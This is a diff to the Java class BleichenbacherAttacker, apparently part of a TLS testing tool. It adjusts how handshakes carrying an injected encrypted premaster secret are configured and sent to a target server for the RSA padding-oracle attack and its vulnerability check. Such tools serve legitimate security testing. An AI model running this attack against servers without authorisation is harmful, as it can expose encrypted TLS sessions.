@@ -68,6 +68,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         }
         RSAPublicKey publicKey;
         Config tlsConfig = config.createConfig();
+        tlsConfig.setAddSignatureAndHashAlgrorithmsExtension(true);
         publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
         if (publicKey == null) {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
@@ -108,10 +109,11 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     private State executeTlsFlow(byte[] encryptedPMS) {
         // we are initializing a new connection in every loop step, since most
         // of the known servers close the connection after an invalid handshake
-        State state = new State(config.createConfig());
-        state.getConfig().setWorkflowTraceType(WorkflowTraceType.HANDSHAKE);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig()
-                .getWorkflowExecutorType(), state);
+        Config tlsConfig = config.createConfig();
+        tlsConfig.setAddSignatureAndHashAlgrorithmsExtension(true);
+        tlsConfig.setWorkflowTraceType(WorkflowTraceType.HANDSHAKE);
+        State state = new State(tlsConfig);
+
         WorkflowTrace trace = state.getWorkflowTrace();
 
         RSAClientKeyExchangeMessage cke = (RSAClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
@@ -119,6 +121,9 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         ModifiableByteArray epms = new ModifiableByteArray();
         epms.setModification(ByteArrayModificationFactory.explicitValue(encryptedPMS));
         cke.setPublicKey(epms);
+
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(state.getConfig()
+                .getWorkflowExecutorType(), state);
 
         workflowExecutor.executeWorkflow();
         return state;
@@ -128,6 +133,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
     public Boolean isVulnerable() {
         RSAPublicKey publicKey;
         Config tlsConfig = config.createConfig();
+        tlsConfig.setAddSignatureAndHashAlgrorithmsExtension(true);
         publicKey = (RSAPublicKey) CertificateFetcher.fetchServerPublicKey(tlsConfig);
         if (publicKey == null) {
             LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
